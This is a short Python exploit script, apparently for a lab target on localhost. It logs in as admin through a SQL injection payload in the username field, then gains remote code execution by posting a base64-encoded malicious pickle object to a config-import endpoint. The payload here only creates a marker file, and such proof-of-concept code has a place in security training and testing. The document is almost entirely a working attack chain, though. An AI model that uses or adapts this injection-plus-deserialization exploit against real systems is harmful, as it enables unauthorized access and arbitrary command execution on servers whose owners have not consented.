import requests
import json
import pickle
import base64
import os

url = "http://127.0.0.1:8080/"

# Auth bypass login
data = {
    "username": "admin' -- -",
    "password": "WHATEVER"
}

bearer = {}

# command to be executed
cmd = "import os; os.system('touch /tmp/pwned.txt')"

# Empty payload dicts
payload = {}

# Create B64 pickle payload which the server deserializes
class Malicious:
    def __reduce__(self):
        return (os.system, ('touch /tmp/pwned.txt',))

malicious_data = base64.b64encode(pickle.dumps(Malicious())).decode()

payload["config"] = malicious_data


# Function to bypass the login function with SQL 
def login(data):
    print("[+] Attempting to bypass login")
    try:
        r = requests.post(url + "login", json=data, timeout=3)
        resp = json.loads(r.text)
        token = resp.get("token")
        print("[+] Token obtained - ", token)

        if not token:
            print("[-] No token Received")

            if "invalid" in resp["reason"]:
                print("[-] Invalid Creds")
                exit(1)
            
            elif "query" in resp["reason"]:
                print("[-] Invalid Query, failed to break out!")
                exit(1) 

        return token

    except requests.exceptions.ConnectionError as e:
        print("[-] Connection Error - ",e)
        exit(1)
    except requests.exceptions.Timeout as e:
        print("[-] Timeout Error - ", e)

# Gain RCE through pickle deserilizeation 
def import_config(bearer, payload):
    print("[+] Attempting to import Config")
    try:
        r = requests.post(url + "admin/import_config", headers=bearer, json=payload, timeout=3)
        resp = json.loads(r.text)

        if resp["imported"] == "0":
            print("[+] Exploit Success")
        else:
            print("[-] Bad payload")

    except requests.exceptions.ConnectionError as e:
        print(e)

def main():
    bearer["Authorization"] = "Bearer " + login(data)
    import_config(bearer, payload)
main()

